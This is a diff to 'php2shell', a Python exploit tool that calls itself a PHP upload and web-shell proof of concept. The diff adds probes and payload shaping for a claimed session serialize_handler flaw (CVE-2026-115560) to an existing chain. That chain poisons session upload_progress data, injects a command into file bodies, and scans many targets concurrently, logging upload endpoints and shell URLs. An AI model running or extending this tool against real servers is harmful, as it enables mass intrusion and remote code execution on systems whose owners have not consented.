@@ -2,7 +2,7 @@
 """
 php2shell — Hybrid PHP upload PoC (authorized testing).
 
-Layer 1: PHP core CVE chain (109618/109619, Auto-LFI discovery, FPM two-step, timing).
+Layer 1: PHP core CVE chain (109618/109619/115560, Auto-LFI discovery, FPM two-step, timing).
 Layer 2: Application-level upload handler discovery + shell verification.
 """
 
@@ -60,6 +60,8 @@ CORE_PROBE_PATHS: tuple[str, ...] = (
 PHP_VERSION_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)
 CVE_109618 = "CVE-2026-109618"
 CVE_109619 = "CVE-2026-109619"
+CVE_115560 = "CVE-2026-115560"
+ALL_CORE_CVES: tuple[str, ...] = (CVE_109618, CVE_109619, CVE_115560)
 
 # First fixed patch per minor branch (eness/php2shell-CVE PoC matrix).
 PHP_BRANCH_FIRST_FIXED: dict[tuple[int, int], int] = {
@@ -68,12 +70,27 @@ PHP_BRANCH_FIRST_FIXED: dict[tuple[int, int], int] = {
     (8, 4): 27,
     (8, 5): 12,
 }
+# session.serialize_handler / upload_progress transition fixes (115560 advisory train).
+PHP_BRANCH_FIRST_FIXED_115560: dict[tuple[int, int], int] = {
+    (8, 2): 36,
+    (8, 3): 37,
+    (8, 4): 28,
+    (8, 5): 13,
+}
+SERIALIZE_HANDLER_MODES: tuple[str, ...] = (
+    "php",
+    "php_serialize",
+    "php_binary",
+    "transition",
+)
+DEFAULT_CORE_SERIALIZE_MODE = "auto"
 
 CORE_RESPONSE_SIGNALS = re.compile(
     r"(upload_progress|UPLOAD_PROGRESS|session\.upload_progress|"
     r"Session object destruction failed|Allowed memory size of|"
     r"memory exhausted|zend_mm_heap|zend_alloc|Fatal error|"
-    r"fatal_error_backtrace|worker.*crash|SIGSEGV|segfault)",
+    r"fatal_error_backtrace|worker.*crash|SIGSEGV|segfault|"
+    r"session\.serialize_handler|php_serialize|Failed to decode session)",
     re.I,
 )
 RE_OOM_109618 = re.compile(
@@ -86,6 +103,20 @@ RE_SESSION_109619 = re.compile(
     r"(session\.upload_progress|PHP_SESSION_UPLOAD_PROGRESS|"
     r"upload_progress\.|Session object destruction failed|"
     r"session_module|ps_files|upload_progress\.name)",
+    re.I,
+)
+RE_SERIALIZE_115560 = re.compile(
+    r"(session\.serialize_handler|serialize_handler|"
+    r"php_serialize|php_binary|ps_serializer|"
+    r"SessionHandler(?:Interface)?::|"
+    r"Failed to decode session|session decode failed|"
+    r"session_start\(\).*serialize|"
+    r"unserialize\(\).*session|"
+    r"upload_progress.*serialize|"
+    r"Cannot use .* as serialize handler|"
+    r"Invalid session serializer|"
+    r"session handler.*mismatch|"
+    r"ps_upload_progress.*handler)",
     re.I,
 )
 RE_WORKER_FAULT = re.compile(
@@ -386,6 +417,9 @@ class PoCConfig:
     lfi_max_urls: int = 0
     lfi_auto_discover: bool = True
     lfi_discover_max_probes: int = DEFAULT_LFI_DISCOVER_MAX_PROBES
+    core_serialize_probe: bool = True
+    core_serialize_mode: str = DEFAULT_CORE_SERIALIZE_MODE
+    core_serialize_transition: bool = True
 
 
 @dataclass
@@ -418,6 +452,7 @@ class CheckResult:
     sapi_type: Optional[str] = None
     oom_threshold: Optional[str] = None
     stale_state: Optional[str] = None
+    serialize_mode: Optional[str] = None
 
 
 @dataclass
@@ -442,6 +477,9 @@ class CoreProbeResult:
     sapi_type: str = SAPI_UNKNOWN
     oom_threshold_bytes: int = 0
     stale_state: str = "unknown"
+    serialize_handler_mode: str = "php"
+    serialize_susceptible: bool = False
+    serialize_events: list[str] = field(default_factory=list)
 
 
 @dataclass
@@ -590,6 +628,99 @@ def classify_php_patch_status(major: int, minor: int, patch: int) -> str:
     if patch >= fixed:
         return "patched"
     return "vulnerable"
+
+
+def is_php_patched_for_cve(fp: PhpFingerprint, cve_id: str) -> bool:
+    if fp.major != 8 or fp.patch <= 0:
+        return False
+    if cve_id == CVE_115560:
+        fixed = PHP_BRANCH_FIRST_FIXED_115560.get((fp.major, fp.minor))
+    else:
+        fixed = PHP_BRANCH_FIRST_FIXED.get((fp.major, fp.minor))
+    if fixed is None:
+        return False
+    return fp.patch >= fixed
+
+
+def merge_cve_id_list(*parts: str) -> str:
+    seen: set[str] = set()
+    ordered: list[str] = []
+    for chunk in parts:
+        if not chunk or chunk == "unknown":
+            continue
+        for token in chunk.replace("(surface)", "").split(","):
+            cve = token.strip()
+            if not cve or cve in seen:
+                continue
+            seen.add(cve)
+            ordered.append(cve)
+    if not ordered:
+        return "unknown"
+    return ",".join(ordered)
+
+
+def wrap_progress_for_serialize_handler(
+    progress_value: str,
+    mode: str,
+    *,
+    marker: str = "",
+) -> str:
+    """
+    Shape PHP_SESSION_UPLOAD_PROGRESS for serialize_handler mismatch research
+    (php_serialize / php_binary vs php runtime transitions — CVE-2026-115560).
+    """
+    inner = marker or progress_value
+    if mode == "php_serialize":
+        name = inner[:96]
+        return (
+            f'upload_progress|a:2:{{s:4:"name";s:{len(name)}:"{name}";'
+            f's:8:"handler";s:13:"php_serialize";}}'
+        )
+    if mode == "php_binary":
+        # Text-safe stub; binary handler paths often surface decode errors in responses.
+        return f"\x00php_binary_stub\x00{inner[:64]}"
+    if mode == "transition":
+        # Deliberate php_serialize-looking prefix with php-native tail (handler flip).
+        tail = inner[:48]
+        return f'|a:1:{{s:4:"data";s:{len(tail)}:"{tail}";}}|{progress_value}'
+    return progress_value
+
+
+def resolve_serialize_probe_modes(config: PoCConfig) -> tuple[str, ...]:
+    mode = (config.core_serialize_mode or DEFAULT_CORE_SERIALIZE_MODE).strip().lower()
+    if mode == "auto":
+        modes: list[str] = ["php_serialize", "php"]
+        if config.core_serialize_transition:
+            modes.append("transition")
+        return tuple(dict.fromkeys(modes))
+    if mode in SERIALIZE_HANDLER_MODES:
+        return (mode,)
+    return ("php_serialize", "php")
+
+
+def parse_serialize_handler_events(body: str, status_code: int) -> list[str]:
+    events: list[str] = []
+    if RE_SERIALIZE_115560.search(body):
+        events.append("serialize:handler-discrepancy-signature")
+    if re.search(r"session\.serialize_handler", body, re.I):
+        events.append("serialize:ini-handler-leak")
+    if re.search(r"php_serialize|php_binary", body, re.I):
+        events.append("serialize:handler-name-surface")
+    if re.search(
+        r"Failed to decode session|session decode failed|Invalid session serializer",
+        body,
+        re.I,
+    ):
+        events.append("serialize:decode-failure")
+    if re.search(r"upload_progress.*serialize|serialize.*upload_progress", body, re.I):
+        events.append("serialize:upload-progress-cross-talk")
+    if re.search(r"Cannot use .* as serialize handler|session handler.*mismatch", body, re.I):
+        events.append("serialize:runtime-handler-mismatch")
+    if status_code in (500, 502, 503) and any(
+        e.startswith("serialize:") for e in events
+    ):
+        events.append("serialize:server-error-on-handler-path")
+    return events
 
 
 def fetch_php_fingerprint(
@@ -905,11 +1036,22 @@ def build_upload_progress_multipart(
     file_body: Optional[bytes] = None,
     progress_value: str = "x",
     max_body_bytes: int = 8192,
+    serialize_handler: Optional[str] = None,
+    serialize_marker: str = "",
+    session_ini_fields: Optional[dict[str, str]] = None,
 ) -> tuple[bytes, str]:
     """
     Craft multipart body targeting PHP session.upload_progress (ikow/php2shell-poc style).
     Optional heap spray fields precede the file part.
+    When serialize_handler is set, progress_value is wrapped for handler mismatch probes (115560).
     """
+    effective_progress = progress_value
+    if serialize_handler and serialize_handler != "php":
+        effective_progress = wrap_progress_for_serialize_handler(
+            progress_value,
+            serialize_handler,
+            marker=serialize_marker,
+        )
     if file_body is not None:
         file_chunk = file_body
     else:
@@ -928,9 +1070,18 @@ def build_upload_progress_multipart(
         b"\r\n",
         f"--{boundary}\r\n".encode(),
         f'Content-Disposition: form-data; name="{PHP_SESSION_UPLOAD_PROGRESS}"\r\n\r\n'.encode(),
-        progress_value.encode("utf-8", errors="replace"),
+        effective_progress.encode("utf-8", errors="surrogateescape"),
         b"\r\n",
     ]
+    for ini_key, ini_val in (session_ini_fields or {}).items():
+        parts.extend(
+            [
+                f"--{boundary}\r\n".encode(),
+                f'Content-Disposition: form-data; name="{ini_key}"\r\n\r\n'.encode(),
+                ini_val.encode("utf-8", errors="replace"),
+                b"\r\n",
+            ]
+        )
     for field_name, field_data in spray_fields or []:
         parts.extend(
             [
@@ -1529,6 +1680,11 @@ def run_core_chain_exploit(
     )
     boundary = make_multipart_boundary(fp.branch_key)
     pad = core.padding_used or config.core_file_padding
+    chain_serialize: Optional[str] = None
+    if core.serialize_susceptible and core.serialize_handler_mode not in ("", "php"):
+        chain_serialize = core.serialize_handler_mode
+    elif config.core_serialize_mode not in ("", "auto", "php"):
+        chain_serialize = config.core_serialize_mode
     body, ct = build_upload_progress_multipart(
         sid=sid,
         progress_name=PHP_SESSION_UPLOAD_PROGRESS,
@@ -1539,11 +1695,21 @@ def run_core_chain_exploit(
         spray_fields=spray,
         file_body=build_chain_file_body(cmd, pad, core.alignment_used),
         progress_value=CORE_CHAIN_MARKER,
+        serialize_handler=chain_serialize,
+        serialize_marker=CORE_CHAIN_MARKER,
+        session_ini_fields=(
+            {"session.serialize_handler": chain_serialize}
+            if chain_serialize
+            else None
+        ),
     )
     _resp, _exc, poison_ms = post_core_multipart(
         session, config, endpoint, sid=sid, boundary=boundary, body=body, content_type=ct
     )
-    notes = [f"session poison POST {poison_ms:.0f}ms spray_fields={len(spray)}"]
+    notes = [
+        f"session poison POST {poison_ms:.0f}ms spray_fields={len(spray)} "
+        f"serialize_mode={chain_serialize or 'php'}"
+    ]
 
     timing_anomaly = False
     if config.core_timing_probe:
@@ -1665,6 +1831,7 @@ def parse_core_memory_events(body: str, status_code: int) -> list[str]:
         events.append("oom:memory-limit-exhausted")
     if RE_SESSION_109619.search(body):
         events.append("session:upload-progress-path")
+    events.extend(parse_serialize_handler_events(body, status_code))
     if re.search(r"Session object destruction failed", body, re.I):
         events.append("session:object-destruction-failed")
     if re.search(r"fatal_error_backtrace", body, re.I):
@@ -1681,14 +1848,21 @@ def classify_cve_from_events(events: list[str], fp: PhpFingerprint) -> str:
     has_619 = any(
         e.startswith("session:") or e == "core:generic-progress-signature" for e in events
     )
-    if has_618 and has_619:
-        return f"{CVE_109618},{CVE_109619}"
+    has_560 = any(e.startswith("serialize:") for e in events)
+    cves: list[str] = []
     if has_618:
-        return CVE_109618
+        cves.append(CVE_109618)
     if has_619:
-        return CVE_109619
+        cves.append(CVE_109619)
+    if has_560:
+        cves.append(CVE_115560)
+    if cves:
+        return ",".join(cves)
     if fp.patch_status in ("vulnerable", "eol-vulnerable"):
-        return f"{CVE_109618},{CVE_109619}(surface)"
+        surface: list[str] = [CVE_109618, CVE_109619]
+        if not is_php_patched_for_cve(fp, CVE_115560):
+            surface.append(CVE_115560)
+        return ",".join(surface) + "(surface)"
     return "unknown"
 
 
@@ -1701,6 +1875,8 @@ def log_core_memory_events(endpoint: str, events: list[str], *, quiet: bool) -> 
             tags.append(f"[red][OOM][/]{ev.split(':', 1)[1]}")
         elif ev.startswith("session:"):
             tags.append(f"[magenta][SESSION][/]{ev.split(':', 1)[1]}")
+        elif ev.startswith("serialize:"):
+            tags.append(f"[cyan][SERIALIZE][/]{ev.split(':', 1)[1]}")
         elif ev.startswith("worker:"):
             tags.append(f"[yellow][WORKER][/]{ev.split(':', 1)[1]}")
         else:
@@ -1718,6 +1894,10 @@ def build_session_chain_hints(sid: str, fp: PhpFingerprint) -> tuple[list[str], 
     if fp.branch_key.startswith("8.5"):
         notes.append("4) PHP 8.5: test fatal_error_backtrace=0 mitigation status on target.")
     notes.append("5) OOM chain (109618): tune padding near memory_limit; watch worker recycle.")
+    notes.append(
+        "6) Serialize handler (115560): probe php_serialize/php_binary -> php transitions; "
+        "align poison multipart with --core-serialize-mode."
+    )
     return paths, notes
 
 
@@ -1734,6 +1914,12 @@ def render_core_exploit_chain(core: CoreProbeResult) -> None:
     if core.oom_threshold_bytes:
         table.add_row("OOM threshold", f"{core.oom_threshold_bytes} bytes (~{core.oom_threshold_bytes // 1024}KB)")
     table.add_row("Stale/UAF", core.stale_state)
+    table.add_row(
+        "Serialize",
+        f"mode={core.serialize_handler_mode} susceptible={core.serialize_susceptible}",
+    )
+    if core.serialize_events:
+        table.add_row("Serialize events", ", ".join(core.serialize_events[:4]))
     table.add_row("Padding", f"{core.padding_used} bytes (align={core.alignment_used})")
     if core.latency_ms:
         table.add_row("Last latency", f"{core.latency_ms:.0f} ms")
@@ -1819,6 +2005,154 @@ def analyze_core_probe_response(
         signals.append("phpsessid-in-body")
 
     return signals, events
+
+
+def probe_serialize_handler_mismatch(
+    session: requests.Session,
+    config: PoCConfig,
+    endpoint_url: str,
+    *,
+    fp: PhpFingerprint,
+    sid: str,
+    file_padding: int,
+    heap_align: int,
+    token: str,
+) -> tuple[list[str], list[str], str, bool]:
+    """
+    Extra multipart probes for session.serialize_handler / upload_progress mismatch (115560).
+    """
+    modes = resolve_serialize_probe_modes(config)
+    all_signals: list[str] = []
+    all_events: list[str] = []
+    best_mode = "php"
+    susceptible = False
+    marker = f"{CORE_MARKER_PREFIX}ser_{token[:6]}"
+
+    for mode in modes:
+        boundary = make_multipart_boundary(fp.branch_key)
+        ini_fields: Optional[dict[str, str]] = None
+        if mode in ("php_serialize", "php_binary", "transition"):
+            ini_fields = {
+                "session.serialize_handler": "php" if mode == "transition" else mode,
+            }
+        body, content_type = build_upload_progress_multipart(
+            sid=sid,
+            progress_name=PHP_SESSION_UPLOAD_PROGRESS,
+            filename=f"{marker}_{mode}.txt",
+            boundary=boundary,
+            file_padding=file_padding,
+            heap_align=heap_align,
+            progress_value=token,
+            serialize_handler=mode,
+            serialize_marker=marker,
+            session_ini_fields=ini_fields,
+        )
+        resp, _exc, _ms = post_core_multipart(
+            session,
+            config,
+            endpoint_url,
+            sid=sid,
+            boundary=boundary,
+            body=body,
+            content_type=content_type,
+        )
+        if resp is None:
+            continue
+        sigs, events = analyze_core_probe_response(resp, token=token, sid=sid, fp=fp)
+        ser_events = parse_serialize_handler_events(resp.text or "", resp.status_code)
+        events = list(dict.fromkeys(events + ser_events))
+        if ser_events:
+            susceptible = True
+            best_mode = mode
+            all_signals.append(f"serialize-probe:{mode}")
+            for ev in ser_events:
+                all_signals.append(f"event:{ev}")
+        all_signals.extend(s for s in sigs if s not in all_signals)
+        all_events.extend(events)
+
+        if mode == "transition" and config.core_serialize_transition:
+            boundary2 = make_multipart_boundary(fp.branch_key)
+            body2, ct2 = build_upload_progress_multipart(
+                sid=sid,
+                progress_name=PHP_SESSION_UPLOAD_PROGRESS,
+                filename=f"{marker}_php_tail.txt",
+                boundary=boundary2,
+                file_padding=max(CORE_DEFAULT_PADDING, file_padding // 2),
+                heap_align=heap_align,
+                progress_value=CORE_CHAIN_MARKER,
+                serialize_handler="php",
+                session_ini_fields={"session.serialize_handler": "php_serialize"},
+            )
+            resp2, _e2, _ms2 = post_core_multipart(
+                session,
+                config,
+                endpoint_url,
+                sid=sid,
+                boundary=boundary2,
+                body=body2,
+                content_type=ct2,
+            )
+            if resp2 is not None:
+                sigs2, events2 = analyze_core_probe_response(
+                    resp2, token=token, sid=sid, fp=fp
+                )
+                ser2 = parse_serialize_handler_events(resp2.text or "", resp2.status_code)
+                if ser2:
+                    susceptible = True
+                    best_mode = "transition"
+                    all_signals.append("serialize-probe:transition-step2")
+                all_signals.extend(s for s in sigs2 if s not in all_signals)
+                all_events.extend(list(dict.fromkeys(events2 + ser2)))
+
+    all_events = list(dict.fromkeys(all_events))
+    return all_signals, all_events, best_mode, susceptible
+
+
+def augment_core_probe_with_serialize(
+    session: requests.Session,
+    config: PoCConfig,
+    endpoint_url: str,
+    result: CoreProbeResult,
+    *,
+    fp: PhpFingerprint,
+) -> CoreProbeResult:
+    if not config.core_serialize_probe:
+        return result
+    token = uuid.uuid4().hex[:10]
+    sigs, events, mode, susceptible = probe_serialize_handler_mismatch(
+        session,
+        config,
+        endpoint_url,
+        fp=fp,
+        sid=result.sid,
+        file_padding=result.padding_used or config.core_file_padding,
+        heap_align=result.alignment_used,
+        token=token,
+    )
+    merged_events = list(dict.fromkeys(result.memory_events + events))
+    merged_signals = list(dict.fromkeys(result.signals + sigs))
+    serialize_events = [e for e in merged_events if e.startswith("serialize:")]
+    result.memory_events = merged_events
+    result.signals = merged_signals
+    result.serialize_handler_mode = mode
+    result.serialize_susceptible = susceptible or bool(serialize_events)
+    result.serialize_events = serialize_events
+    result.cve_ids = classify_cve_from_events(merged_events, fp)
+
+    serialize_hit = bool(serialize_events) or susceptible
+    if serialize_hit and not result.vulnerable:
+        if config.strict_cve:
+            if serialize_hit and fp.patch_status != "patched":
+                if not is_php_patched_for_cve(fp, CVE_115560):
+                    result.vulnerable = True
+        else:
+            result.vulnerable = fp.patch_status != "patched" and (
+                len(merged_signals) >= 2 or serialize_hit
+            )
+    elif serialize_hit and result.vulnerable:
+        result.vulnerable = fp.patch_status != "patched"
+
+    return result
 
 
 def core_probe_single_attempt(
@@ -1910,11 +2244,17 @@ def core_probe_single_attempt(
         and not cve_ids.endswith("(surface)")
         and fp.patch_status in ("vulnerable", "eol-vulnerable", "unknown")
     )
-    loose_ok = len(signals) >= 2 or (
-        "filename-token-reflected" in signals and "session-handshake" in signals
+    has_serialize = any(e.startswith("serialize:") for e in events)
+    loose_ok = (
+        len(signals) >= 2
+        or ("filename-token-reflected" in signals and "session-handshake" in signals)
+        or has_serialize
     )
     if config.strict_cve:
-        vulnerable = strict_ok and fp.patch_status != "patched"
+        blocks_probe = fp.patch_status == "patched"
+        if has_serialize and fp.major == 8:
+            blocks_probe = is_php_patched_for_cve(fp, CVE_115560)
+        vulnerable = strict_ok and not blocks_probe
     else:
         vulnerable = loose_ok and fp.patch_status != "patched"
 
@@ -1994,6 +2334,10 @@ def core_probe_endpoint(
                 best = result
             elif best and result.vulnerable and len(result.memory_events) > len(best.memory_events):
                 best = result
+    if best is not None:
+        best = augment_core_probe_with_serialize(
+            session, config, endpoint_url, best, fp=fp
+        )
     fallback = CoreProbeResult(
         False,
         endpoint_url,
@@ -2112,6 +2456,8 @@ def hybrid_vulnerability_check(
             f"sid={core.sid}; cve={core.cve_ids}; patch={core.patch_status}; "
             f"php={core.php_version}; sapi={core.sapi_type}; "
             f"oom={core.oom_threshold_bytes}; stale={core.stale_state}; "
+            f"serialize_mode={core.serialize_handler_mode}; "
+            f"serialize_sus={core.serialize_susceptible}; "
             f"pad={core.padding_used}; align={core.alignment_used}; "
             f"signals={','.join(core.signals)}; events={','.join(core.memory_events)}"
         )
@@ -3250,7 +3596,8 @@ def publish_vuln_hit(result: CheckResult, output_path: Optional[str]) -> None:
     line = (
         f"{result.target_url}\t{result.upload_endpoint or ''}\t{result.shell_url or ''}\t"
         f"{result.vector or ''}\t{result.cve_ids or ''}\t{result.patch_status or ''}\t"
-        f"{result.sapi_type or ''}\t{result.oom_threshold or ''}\t{result.stale_state or ''}"
+        f"{result.sapi_type or ''}\t{result.oom_threshold or ''}\t{result.stale_state or ''}\t"
+        f"{result.serialize_mode or ''}"
     )
     append_line_locked(output_path, line)
     with _io_lock:
@@ -3258,6 +3605,7 @@ def publish_vuln_hit(result: CheckResult, output_path: Optional[str]) -> None:
             f"[green bold][VULN][/] {result.target_url}  "
             f"[dim]vector={result.vector or 'unknown'}[/]  "
             f"[dim]cve={result.cve_ids or '-'}[/]  "
+            f"[dim]serialize={result.serialize_mode or '-'}[/]  "
             f"[dim]upload:[/] {result.upload_endpoint}  [dim]shell:[/] {result.shell_url}"
         )
         if result.core_detail:
@@ -3272,7 +3620,7 @@ def mass_check_worker(base_config: PoCConfig, target_url: str) -> CheckResult:
         vuln, shell, waf, endpoint, vector, core_detail = hybrid_vulnerability_check(
             session, quiet_cfg, target_url
         )
-        cve_ids = patch_status = sapi_type = oom_threshold = stale_state = None
+        cve_ids = patch_status = sapi_type = oom_threshold = stale_state = serialize_mode = None
         if core_detail:
             for part in core_detail.split(";"):
                 p = part.strip()
@@ -3286,6 +3634,8 @@ def mass_check_worker(base_config: PoCConfig, target_url: str) -> CheckResult:
                     oom_threshold = p[4:]
                 elif p.startswith("stale="):
                     stale_state = p[6:]
+                elif p.startswith("serialize_mode="):
+                    serialize_mode = p[15:]
         return CheckResult(
             target_url=target_url,
             vulnerable=vuln,
@@ -3299,6 +3649,7 @@ def mass_check_worker(base_config: PoCConfig, target_url: str) -> CheckResult:
             sapi_type=sapi_type,
             oom_threshold=oom_threshold,
             stale_state=stale_state,
+            serialize_mode=serialize_mode,
         )
     except Exception:
         return CheckResult(target_url=target_url, vulnerable=False)
@@ -3444,7 +3795,7 @@ def run_mass_check(
     if output_path:
         Path(output_path).write_text(
             "original_url\tupload_endpoint\tshell_url\tvector\tcve\tpatch_status\t"
-            "sapi\toom_threshold\tstale_state\n",
+            "sapi\toom_threshold\tstale_state\tserialize_mode\n",
             encoding="utf-8",
         )
     if base_config.discovery_log and base_config.discovery_log != "-":
@@ -3467,7 +3818,8 @@ def run_mass_check(
             f"Adaptive: [green]{'on' if base_config.core_adaptive else 'off'}[/] | "
             f"ASLR probe: [green]{'on' if base_config.core_aslr_probe else 'off'}[/] | "
             f"SAPI auto: [green]{'on' if base_config.core_sapi_auto else 'off'}[/] | "
-            f"OOM fuzz: [green]{'on' if base_config.core_oom_fuzz else 'off'}[/]\n"
+            f"OOM fuzz: [green]{'on' if base_config.core_oom_fuzz else 'off'}[/] | "
+            f"Serialize probe (115560): [green]{'on' if base_config.core_serialize_probe else 'off'}[/]\n"
             f"{discovery_note}",
             border_style="cyan",
         )
@@ -3636,7 +3988,7 @@ Examples:
   Single target check:
     python poc.py -u http://target.com/upload.php --check
 
-  Mass hybrid check (CVE-2026 core probe + app upload):
+  Mass hybrid check (CVE-2026-109618/109619/115560 core probe + app upload):
     python poc.py -f targets.txt --check --threads 20 --output results.txt
 
   Strict CVE signatures + adaptive padding (single target):
@@ -3662,7 +4014,10 @@ Examples:
 """
     parser = argparse.ArgumentParser(
         prog="php2shell",
-        description="PHP upload / web-shell PoC (single + mass concurrent scanning).",
+        description=(
+            "PHP upload / web-shell PoC (single + mass concurrent scanning). "
+            "Core layer covers CVE-2026-109618, CVE-2026-109619, CVE-2026-115560."
+        ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog=examples,
     )
@@ -3778,7 +4133,7 @@ Examples:
     parser.add_argument(
         "--strict-cve",
         action="store_true",
-        help="Require CVE-specific response signatures; skip probes when PHP version is patched",
+        help="Require CVE-specific signatures (109618/109619/115560); skip when PHP is patched",
     )
     parser.add_argument(
         "--core-adaptive",
@@ -3862,6 +4217,22 @@ Examples:
         "--core-worker-pin",
         action="store_true",
         help="Force keep-alive single-connection pool (PHP-FPM worker pinning)",
+    )
+    parser.add_argument(
+        "--no-core-serialize-probe",
+        action="store_true",
+        help="Disable CVE-2026-115560 session.serialize_handler / upload_progress probes",
+    )
+    parser.add_argument(
+        "--core-serialize-mode",
+        default=DEFAULT_CORE_SERIALIZE_MODE,
+        choices=["auto", *SERIALIZE_HANDLER_MODES],
+        help="Shape progress payload for serialize_handler mismatch research (115560)",
+    )
+    parser.add_argument(
+        "--no-core-serialize-transition",
+        action="store_true",
+        help="Skip php_serialize/php_binary -> php two-step transition probe",
     )
     return parser
 
@@ -3957,6 +4328,9 @@ def main(argv: Optional[list[str]] = None) -> int:
         ),
         core_sapi_auto=not args.no_sapi_auto,
         core_worker_pin=args.core_worker_pin,
+        core_serialize_probe=not args.no_core_serialize_probe,
+        core_serialize_mode=args.core_serialize_mode,
+        core_serialize_transition=not args.no_core_serialize_transition,
     )
 
     if args.core_chain and not args.core_endpoint_only:
